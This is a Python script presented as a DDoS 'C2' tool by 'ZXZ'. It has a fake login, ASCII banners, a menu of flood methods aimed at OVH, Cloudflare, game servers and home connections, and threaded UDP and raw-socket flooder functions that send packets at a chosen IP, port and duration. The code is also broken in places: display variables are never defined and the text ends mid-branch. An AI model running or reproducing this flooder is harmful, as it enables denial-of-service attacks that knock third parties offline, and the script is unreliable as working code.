#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

prot = (random.randint(23100,32100))
sys.stdout.write("\x1b]2;[-] ZXZ | Online User : [{}] | Running Attack [5] | Bot Connected [89] | Admin : [ZXZ] | Username : ZXZ\x07".format (prot))

os.system("clear")
print("""\033[93m
\033[35m                        ╔═╗═╗\033[93m ╦╔═╗
\033[35m                        ╔═╝╔╩╦\033[93m╝╔═╝
\033[35m                        ╚═╝╩ ╚═╚\033[93m═╝

             \033[93m>> \033[96mPrivate Tools By ZXZ \033[93m<< 
            \033[97m
             """)
username = str(input("\033[33m[ZXZ] \033[93mUsername:"))
password = str(input("\033[33m[ZXZ] \033[93mPassword:"))
if password == "ZXZ" and username == "Senzu":
    print ("Logged In Tools C2 By ZXZ")
    time.sleep(2)

else:
    print ("Password Salah. Coba Lagi.")
    time.sleep(999)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)


nicknm = "ZXZ"

mt = """\033[96mService under \033[0;93mmaintance"""

welcome = """
    o       o 
    |`.   .´| 
    |  \O/  | 
    |   |   | 
    |  / \  | 
    |.'   '.| 
    "       " 
"""

welcome2 = """
    o       o 
    |:     ;| 
    | '   ' | 
    |       | 
    |       | 
    |.·   ·.| 
    "       " 
"""

welcome3 = """
    o       o 
    |:     ;| 
    |'     '| 
    |       | 
    |       | 
    | .   . | 
    "´     `" 

"""

welcome4 = """
    o       o 
    |;     :| 
    ´       ` 
    |       | 
    |       | 
    |       | 
    "'·   ·'" 
"""

welcome5 = """
    o       o 
    |:     :| 
    |'     '| 
    |       | 
    |       | 
    |       | 
    ":     :" 
"""

send1 = """
|\**/|      
\ == /
 |  |
 |  |
 \  /
  \/
  
  
  
  
________________________________________
"""

send2 = """

|\**/|      
\ == /
 |  |
 |  |
 \  /
  \/
  
  
  
________________________________________
"""

send3 = """


|\**/|      
\ == /
 |  |
 |  |
 \  /
  \/
  
  
________________________________________
"""

send4 = """



|\**/|      
\ == /
 |  |
 |  |
 \  /
  \/
  
________________________________________
"""

send5 = """




|\**/|      
\ == /
 |  |
 |  |
 \  /
  \/
________________________________________
"""

send6 = """
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 __________.,-#%&$@%#&#~,._______________
"""

methods = """
\033[93m
\033[93m
\033[35m                                  ╔═╗═╗\033[93m ╦╔═╗
\033[35m                                  ╔═╝╔╩╦\033[93m╝╔═╝
\033[35m                                  ╚═╝╩ ╚═╚\033[93m═╝
\033[93m
\033[93m             HOME METHODS     SERVER       BYPASSES      BYPASSES
\033[93m            ╔════════════╗╔════════════╗╔════════════╗╔════════════╗
\033[93m            ║ HOME       ║║ OVH        ║║ UDPBYPASS  ║║ FIVEM      ║
\033[93m            ║ XXXX       ║║ OVHKILL    ║║ DDOS-GUARD ║║ XXXXXX     ║
\033[93m            ║ XXXXXX     ║║ OVHDOWN    ║║ XXXXXXXX   ║║ ROBLOX     ║
\033[93m            ╚════════════╝╚════════════╝╚════════════╝╚════════════╝
\033[93m               BYPASSES      SERVER        SERVER         LAYER7
\033[93m            ╔════════════╗╔════════════╗╔════════════╗╔════════════╗
\033[93m            ║ CFB        ║║ NFO-NULL   ║║ UDP-SAMP      ║║ HTTPS      ║
\033[93m            ║ HTTP       ║║ KILLALL    ║║ UDP-DOWN   ║║ STRESSTER  ║
\033[93m            ║ HOME       ║║ HYDRA      ║║ UDP-KILL  ║║ HTTP-CLD   ║
\033[93m            ╚════════════╝╚════════════╝╚════════════╝╚════════════╝
\033[93m               BYPASSES      SERVER        SERVER          VIP
\033[93m            ╔════════════╗╔════════════╗╔════════════╗╔════════════╗
\033[93m            ║ XXXXXXXXX  ║║ TCP                 ║║ CF         ║║ OVH        ║
\033[93m            ║ XXXXXXXXX  ║║ TCP-DOWN    ║║ HTTPS-STM  ║║ XXXXXX     ║
\033[93m            ║ XXXXXXXXX  ║║ HOME       ║║ CFB        ║║ XXXXXX     ║
\033[93m            ╚════════════╝╚════════════╝╚════════════╝╚════════════╝
\033[93m            ╔═══════════════════════════════════════════════════════╗
\033[93m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[93m            ╚═══════════════════════════════════════════════════════╝
"""

ticket = """
\033[96m Dm ZXZ#4106
"""

banner =  """
\033[35m                                  ╔═╗═╗\033[93m ╦╔═╗
\033[35m                                  ╔═╝╔╩╦\033[93m╝╔═╝
\033[35m                                  ╚═╝╩ ╚═╚\033[93m═╝

\033[93m                ╔═══════════════════════════════════════════════╗
\033[93m                ║\033[32m- - - - - - - Joker vF By \033[36m@senzuΣX \033[35m- - - - - - -║
\033[93m                ║\033[32m  - - - Type \033[36mmethods\033[35m see the Help Menu - - - - ║
\033[93m                ╚═══════════════════════════════════════════════╝
"""
attacked =  """\033[97m[INFO] Your Attack Has Been Launched!!!"""

helpservice = """
\033[35m                                  ╔═╗═╗\033[93m ╦╔═╗
\033[35m                                  ╔═╝╔╩╦\033[93m╝╔═╝
\033[35m                                  ╚═╝╩ ╚═╚\033[93m═╝

\033[0;93m            ╔══════════════════════════╦═══════════════════════╗
\033[0;93m            ║                    HELP COMMAND                  ║
\033[0;93m            ╚═╦═══════════════════════╦╩╦════════════════════╦═╝
\033[0;93m             ╔╩═══════════════════════╩═╩════════════════════╩╗
\033[0;93m             ║ \033[33m - ticket                                      \033[0;93m║
\033[0;93m             ║ \033[33m - plant                                       \033[0;93m║
\033[0;93m             ║ \033[33m - udpbypass [IP] [TIME] [PORT]                \033[0;93m║
\033[0;93m             ║ \033[33m - Layer7 [COMING SOON]                        \033[0;93m║    
\033[0;93m             ║ \033[33m - Layer4 [COMING SOON]                        \033[0;93m║                     
\033[0;93m             ║ \033[33m - methods                                     \033[0;93m║
\033[0;93m             ╚╦══════════════════════════════════════════════╦╝
\033[0;93m              ║\033[93m       \033[93mEXAMPLE \033[33m[methods] 8.8.8.8 60 80        \033[0;93m║
\033[0;93m              ╚══════════════════════════════════════════════╝\033[0;93m
"""


cooldown = """
\033[0;96m      
\033[0;96m                               LOADING FOR MINUTES       
\033[0;96m                              
\033[0;96m =============ZXZ CREATED THIS C2======================"""
invalid = """\033[0;96mInvalid\033[0;93mCommands"""
cookie = open(".sinfull_cookie","w+")

loading = """\033[93m
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  Loading...     |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"    
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'
"""

loading2 = """\033[93m
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  Loading..      |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"    
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'
"""

loading3 = """\033[93m
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  Loading.       |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"    
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'
"""
wait = """\033[91m

             ▄▄▄ ▄▄▄
            █████████  
             ▀█████▀
               ▀█▀
"""

wait2 = """

             .oo.oo.
            d8888888b    
            '8888888'
              '888'
                '
"""

wait3 = """
             .-. .-.
            (   '   )    
             `.   .´
               `:´
"""

wait4 = """

             ┌─┐ ┌─┐
            ┌┘ └┬┘ └┐
            ╘╕     ╒╛    
             ╘═╕ ╒═╛
               ╘╤╛
"""

plant = """
\033[0;35m VIP = TRUE
\033[0;35m USERNAME = admin                
\033[0;35m ADMIN = TRUE
\033[0;35m EXPIRED TIME = NEVER
\033[0;35m API ACCESS = TRUE
"""

welcome = """
    o       o 
    |`.   .´| 
    |  \O/  | 
    |   |   | 
    |  / \  | 
    |.'   '.| 
    "       " 
"""

welcome2 = """
    o       o 
    |:     ;| 
    | '   ' | 
    |       | 
    |       | 
    |.·   ·.| 
    "       " 
"""

welcome3 = """
    o       o 
    |:     ;| 
    |'     '| 
    |       | 
    |       | 
    | .   . | 
    "´     `" 

"""

welcome4 = """
    o       o 
    |;     :| 
    ´       ` 
    |       | 
    |       | 
    |       | 
    "'·   ·'" 
"""

welcome5 = """
    o       o 
    |:     :| 
    |'     '| 
    |       | 
    |       | 
    |       | 
    ":     :" 
"""

send1 = """
|\**/|      
\ == /
 |  |
 |  |
 \  /
  \/
  
  
  
  
________________________________________
"""

send2 = """

|\**/|      
\ == /
 |  |
 |  |
 \  /
  \/
  
  
  
________________________________________
"""

send3 = """


|\**/|      
\ == /
 |  |
 |  |
 \  /
  \/
  
  
________________________________________
"""

send4 = """



|\**/|      
\ == /
 |  |
 |  |
 \  /
  \/
  
________________________________________
"""

send5 = """




|\**/|      
\ == /
 |  |
 |  |
 \  /
  \/
________________________________________
"""

send6 = """
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 __________.,-#%&$@%#&#~,._______________
"""

fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(host, timer, port, punch):
    global iaid
    global aid
    global tattacks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    running += 1
    while time.time() < timeout and ldap and attack:
        sock.sendto(punch, (host, int(port)))
    running -= 1
    iaid -= 1
    aid -= 1
              
              


def stdsender(host, port, timer, payload):
    global atks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp

    while True:
        powerran = (random.randint(23100,32100))
        sys.stdout.write("\x1b]2;[-]ZXZ | Online User : [{}] | Running Attack [6] | Bot Connected [89] | Admin : [ZXZ] | Backup Server : [2] | Username : ZXZ\x07".format (powerran))
        sin = input("\033[95m[\033[97m@ZXZ\033[95m]\033[37m >> \033[92m".format(nicknm)).lower()
        sinput = sin.split(" ")[0]

        if sinput == "clear":
            os.system ("clear")
            print (banner)
            main()
        if sinput == "methods":
            os.system ("clear")
            print (wait)
            time.sleep(2)
            os.system ("clear")
            print (wait2)
            time.sleep(2)
            os.system ("clear")
            print (wait3)
            time.sleep(2)
            os.system ("clear")
            print (wait4)
            time.sleep(2)
            os.system("clear")
            print (methods)
            main()
        if sinput == "method":
            os.system ("clear")
            print (wait)
            time.sleep(2)
            os.system ("clear")
            print (wait2)
            time.sleep(2)
            os.system ("clear")
            print (wait3)
            time.sleep(2)
            os.system ("clear")
            print (wait4)
            time.sleep(2)
            os.system("clear")
            print (methods)
            main()
        if sinput == "ticket":
            os.system ("clear")
            print (ticket)
            main()
        if sinput == "clear":
            os.system ("clear")
            print (banner)
            main()
        elif sinput == "banner":
            os.system ("clear")
            print (banner)
            main()
        elif sinput == "helpservice":
            os.system('clear')
            print (loading)
            time.sleep(2)
            os.system('clear')
            print (loading2)
            time.sleep(2)
            os.system('clear')
            print (loading3)
            time.sleep(2)
            os.system ('clear')
            print (helpservice)
            main()
        elif sinput == "":
            print(invalid)
            main()
        if sinput == "plant":
            os.system ("clear")
            print (welcome)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome2)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome3)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome4)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome5)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome2)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome3)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome4)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome5)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome2)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome3)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome4)
            time.sleep(0.1)
            os.system ("clear")
            print (welcome5)
            time.sleep(0.1)
            os.system ("clear")
            print (plant)
            main()
        elif sinput == "leave":
            os.system("clear")
            print(send1)
            time.sleep(0.9)
            os.system("clear")
            print(send2)
            time.sleep(0.9)
            os.system("clear")
            print(send3)
            time.sleep(0.9)
            os.system("clear")
            print(send4)
            time.sleep(0.9)
            os.system("clear")
            print(send5)
            time.sleep(0.9)
            os.system("clear")
            print(banner)
            time.sleep(0.9)
           
            os.system ("clear")
            exit()
    

        elif sinput == "udp":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 899
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udpbypass":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 40159
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcp":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 11179
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "cf":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 1045
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovh":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x00\x20\x10\x2f"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        os.system("clear")
                        print(start)
                        time.sleep(1)
                        os.system("clear")
                        print(start2)
                        time.sleep(1)
                        os.system("clear")
                        print(start3)
                        time.sleep(1)
                        os.system("clear")
                        print(start4)
                        time.sleep(1)
                        os.system("clear")
                        print(start5)
                        time.sleep(1)
                        os.system("clear")
                        print(start6)
                        time.sleep(1)
                        os.system("clear")
                        print(start7)
                        time.sleep(1)
                        os.system("clear")
                        print(start8)
                        time.sleep(1)
                        os.system("clear")
                        print(start9)
                        time.sleep(1)
                        os.system("clear")
                        print(start10)
                        time.sleep(1)                    
                        print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "cfb":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 6550
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                 
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovhkill":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x16\x10\x20\x16\x10\x00\x00\x10\x00\x20\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()               
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovhdown":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x10\x20\x10\x00\x00\x20\x15\x00\x10\x00\x16\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    print(attacked)
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "http":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 6550
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "home":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 6109
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "stresster":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 70157
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                 
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "http-stm":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65599
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                 
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "http-cld":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65512
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                 
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ddos-guard":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 86990
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                 
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udp-down":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 666
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udp-kill":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 97059
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
